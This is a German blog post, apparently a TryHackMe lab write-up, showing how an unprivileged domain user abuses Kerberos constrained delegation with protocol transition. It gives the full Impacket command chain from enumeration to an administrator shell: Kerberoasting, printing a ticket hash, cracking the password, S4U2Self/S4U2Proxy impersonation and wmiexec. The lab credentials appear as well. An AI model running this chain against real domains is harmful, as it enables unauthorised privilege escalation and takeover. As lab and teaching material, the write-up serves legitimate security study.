---
date: '2026-06-07T12:00:38+06:00'
draft: true
title: 'Missbrauch der eingeschränkten Delegation ohne lokale Administratorrechte'
---

Es gibt ein hartnäckiges Missverständnis beim Penetration Testing von Active Directory: Viele glauben, dass man für einen Angriff auf die eingeschränkte Delegation (Constrained Delegation) zuerst einen Host kompromittieren, lokale Administratorrechte erlangen und Anmeldedaten aus dem Speicher auslesen muss.

Das Auslesen von LSASS ist zwar ein Standardweg, aber keineswegs eine zwingende Voraussetzung. Wenn es sich beim Ziel um ein Benutzerkonto mit einem schwachen Passwort handelt, kann ein normaler Domänenbenutzer einen vollständigen Delegationsangriff durchführen. Dadurch lässt sich eine Identitätsübernahme (Impersonation) des Domänen-Administrators komplett über das Netzwerk realisieren – ohne jemals die Festplatte eines Ziel-Endpunkts zu berühren oder erhöhte Berechtigungen zu benötigen.

Es folgt eine analytische Aufschlüsselung, wie die Kombination aus Kerberoasting und Protokollübergang (Protocol Transition) eine Domänenkompromittierung ohne Admin-Rechte ermöglicht. Der Fokus liegt dabei auf den zugrundeliegenden Mechanismen der Kerberos S4U-Erweiterungen.

## Phase 1: Identifizierung der Fehlkonfiguration (Zero-Touch-Enumeration)

Der Angriff beginnt aus der Perspektive eines standardmäßigen, unprivilegierten Domänenbenutzers. Das Ziel besteht darin, das Active Directory via LDAP nach Konten abzufragen, die für die eingeschränkte Delegation konfiguriert sind.

Hier ist die Standard-LDAP-Enumerationsausgabe über Impacket:

```bash
impacket-findDelegation 'za.tryhackme.loc/t2_leon.francis:Password!1' -dc-ip 10.200.72.101

```

```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

AccountName  AccountType  DelegationType                      DelegationRightsTo                 SPN Exists 
-----------  -----------  ----------------------------------  ---------------------------------  ----------
THMDC$       Computer     Unconstrained                       N/A                                Yes        
svcIIS       Person       Constrained w/ Protocol Transition  WSMAN/THMSERVER1.za.tryhackme.loc  Yes        
svcIIS       Person       Constrained w/ Protocol Transition  WSMAN/THMSERVER1                   Yes        
svcIIS       Person       Constrained w/ Protocol Transition  http/THMSERVER1.za.tryhackme.loc   No         
svcIIS       Person       Constrained w/ Protocol Transition  http/THMSERVER1                    No         

```

**Die Funktionsweise:**

Das entscheidende Element hierbei ist `Constrained w/ Protocol Transition`. Im Active Directory entspricht dies dem User Account Control-Flag `TRUSTED_TO_AUTH_FOR_DELEGATION` (T2A4D).

Wenn ein Dienstkonto dieses Flag besitzt, ist es ihm gestattet, die Kerberos-Erweiterung **S4U2Self** zu nutzen. Das bedeutet, dass das Konto `svcIIS` ein Service-Ticket für sich selbst im Namen *jedes beliebigen* anderen Benutzers in der Domäne anfordern kann, ohne dass dieser Benutzer ein Passwort angeben muss. Die Spalte `DelegationRightsTo` bestimmt, wohin dieses Ticket anschließend weitergeleitet werden darf.

Da `svcIIS` als `Person` (ein Benutzerkonto, kein Computerkonto) deklariert ist, ist es sehr wahrscheinlich, dass ihm ein Dienstprinzipalname (Service Principal Name, SPN) zugewiesen ist. Das macht es zu einem idealen Ziel für Offline-Angriffe.

## Phase 2: Die stille Extraktion (Kerberoasting)

Wäre `svcIIS` ein Computerkonto oder ein gruppenverwaltetes Dienstkonto (gMSA), wären lokale Administratorrechte erforderlich, um das rotierende, 120 Zeichen lange Passwort aus dem Speicher auszulesen. Da es sich jedoch um ein normales Benutzerkonto handelt, erlaubt es das Kerberos-Protokoll jedem authentifizierten Benutzer, ein TGS-Ticket (Ticket Granting Service) für dieses Konto anzufordern.

```bash
impacket-GetUserSPNs 'za.tryhackme.loc/t2_leon.francis:Password!1' -dc-ip 10.200.72.101 -request-user svcIIS -outputfile svciis_hash.txt

```

```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName              Name    MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------------------  ------  --------  --------------------------  --------------------------  -----------
HTTP/svcServWeb.za.tryhackme.loc  svcIIS            2022-04-29 06:50:25.152583  2026-06-06 02:39:59.678483  constrained 

```

```bash
cat svciis_hash.txt 

```

```bash
$krb5tgs$23$*svcIIS$ZA.TRYHACKME.LOC$za.tryhackme.loc/svcIIS*$7a12eb6bc2931fcdce8642b84802abf3$de111089e45e098cae387582a264b65134254d525944fad820e2fa158049f95997a8e433152464da942d3fe8732aee21a026fa9bb6c5b921024a9afa21fe9996142b131e0fda7e363be164c241a1ccf22f896275c5336fa28efb1c56fcfbb573a172eff6f696092b9246e62265c69436fa0fb05b3b3eb85554238b793803ad4f20bb43d852617c3bbbecfa882b681b55c2799bc8f0d0fd20b42f909c07f0daa10330c70986c28d9fe805bbc4658e0c91bf3d018580c383090f6b2c261780c66981b122692341e941bed71523cef3e45f80ae021eaa0401505ff9953b577e8d80d639e6dd311bbda0f4663835954a0177076afd4dd28413840786f0978fc346e9b2a9582fcd4ba063b1aea416d7c24ea16c001c282cde5dc6e595674c94a7f909097c777b26cbcccdf08631a041d2133d7f7ad0251869271162e2fbcf297b889c3962fe79c773b855f33ddfebe2f0f8fb1c2db1dd953265fb053593ca86f8cfc7286d0209c5817ebf07dbaec3cc729c60aa157385caa6d43e6d05b202044c9dfab264c2e31417de824d6df97b0151416daed3019c9f14dd720283046615adfb09033d664603170317b8bc441b745e06fc50ca4dca29d795a6adafbcc8e76892854cd8a6f9e6e7d0e3289f96825537ca4f2816fe0760bfc519bcc4a8e75c746e70437233da7ee2c2eaf4c029ba52db618e83894a043e3bd0e879e01fc331fec4aa0f94b60dcc9c8dc9687b8e6d3844928a1972afe26a2a365047c164663689da81ec49dedb8c78cdffd8ae8db066d616890808d6de02f65914d4476235654684b1d62bedf952ad217ca34271115b30254df47272b8601f420de177dfaa569f9b22aa597616a94a25c8e7e43c02a9b6f2c715ddbc80254c7fd6bea60a8b96aa897596709d2bafb476a90aa4a5e3899ecdbabc5bf2419ca819973c5f6d84a0b64c712b0236c63bcdc8e55e3431f0a1763065f4ad8932376be754c6fcaf07e0318cbcaf0974e81ce4015e230a37bca6e0479440349afba0f0cd95f19eae02c40bbffdb48aff8c0501a787f11447a1b7350b4246b2aa27ee146de7e2c7386b82a52fa0f4631a05d14f47c12df65a7aff10d1a73c1856e729672771b502e591cf22334132f037a91cdb3aabccb28b86d844fe65f9fa482b7cd58912ede84524284ea930b3e976a4c4e00294d4c564f6e7acdc4d461e7e4d084e44f01e242aad481ba591381dd5ac767d236c5fc836695df90bb7f6d2db3fc7a2970218ed765e0fecf4f7fb6b71b6bd1ccf1ed2ba83c7b5e07cf2cbb7168ab4f837241dcb841f7cf64253684cd82b3ab6e2d54db8843149eaee768198aca08c4f91229a26cd5682ea1b5e774e0b62fa4931a47a2e7623471b83d2453608741e848812316a01df8e749789dec723b9e9083e1c

```

**Die Funktionsweise:**

Der Domänencontroller (Domain Controller, DC) gibt ein TGS-Ticket zurück, das mit dem RC4-HMAC-Hash des Passworts vom `svcIIS`-Konto verschlüsselt ist. Der Angreifer besitzt nun das kryptografische Material, das für eine Authentifizierung als `svcIIS` benötigt wird. Indem dieser Hash offline genommen und gecrackt wird (was das Passwort `Password1@` offenbart), erlangt der Angreifer die vollständige Kontrolle über das Dienstkonto, ohne jemals Code auf dem eigentlichen IIS-Server ausgeführt zu haben.

## Phase 3: Fälschen des VIP-Tickets (S4U2Self & S4U2Proxy)

An diesem Punkt wird das Szenario der "Kompromittierung ohne Admin-Rechte" greifbar. Mit dem wiederhergestellten Klartext-Passwort leitet der Angreifer den NT-Hash ab (`43460d636f269c709b20049cee36ae7a`) und startet den Protokollmissbrauch.

```bash
impacket-getST za.tryhackme.loc/svcIIS -hashes :43460d636f269c709b20049cee36ae7a -spn wsman/THMSERVER1.za.tryhackme.loc -impersonate Administrator -k

```

```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@wsman_THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.ccache

```

**Die Funktionsweise:**

Dieser einzige Befehl führt den Kern des Angriffs auf die eingeschränkte Delegation vollständig über das Netzwerk aus:

1. **S4U2Self:** Der Angreifer authentifiziert sich als `svcIIS` und fordert im Namen des `Administrator`-Kontos ein Ticket für sich selbst an. Da für `svcIIS` der Protokollübergang (Protocol Transition) aktiviert ist, gibt der Domänencontroller nach und stellt ein weiterleitbares Ticket (forwardable ticket) aus.
2. **S4U2Proxy:** Der Angreifer nimmt dieses weiterleitbare Ticket sofort und legt es dem Domänencontroller erneut vor. Dabei fordert er Zugriff auf den nachgelagerten Dienst an, der in der LDAP-Enumeration definiert wurde (`wsman/THMSERVER1`).
3. **Das Ergebnis:** Der DC stellt ein gültiges Kerberos-Service-Ticket aus, das beweist, dass der Angreifer der Domänen-`Administrator` für diesen spezifischen Dienst ist.

Zu keinem Zeitpunkt musste das Passwort des `Administrator`-Kontos erraten werden, noch war eine Sitzung mit erhöhten Rechten erforderlich.

## Phase 4: Realistische Ausführung mit maximaler Auswirkung

Nachdem das gefälschte Ticket in den lokalen Anmeldedaten-Cache (Credential Cache) exportiert wurde, kann der Angreifer native Fernverwaltungsprotokolle wie WMI (Windows Management Instrumentation) oder WinRM nutzen, um mit dem Zielserver zu interagieren.

```bash
export KRB5CCNAME=Administrator@wsman_THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.ccache

```

```bash
impacket-wmiexec -k -no-pass za.tryhackme.loc/Administrator@THMSERVER1.za.tryhackme.loc

```

```bash
za.tryhackme.loc/Administrator@THMSERVER1.za.tryhackme.loc
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
za\administrator

C:\>

```

**Die Auswirkung:**

Wenn man die Datenintegrität dieses Angriffspfads bewertet, wird die Tragweite schnell deutlich. Ein Angreifer mit geringen Berechtigungen hat eine standardmäßige Protokollfunktion ausgenutzt, um Sicherheitsgrenzen zu umgehen. Das Ergebnis ist eine interaktive Shell mit `Administrator`-Rechten auf einem sensiblen Server.

Sich auf die Annahme zu verlassen, dass Angreifer zuerst Endpunkte kompromittieren müssen, um die Delegation zu missbrauchen, schafft einen gefährlichen blinden Fleck. Solange der Protokollübergang mit leicht zu crackenden Passwörtern kombiniert wird, bleibt das Netzwerk anfällig für eine remote durchgeführte Domänenkompromittierung ohne Privilegien.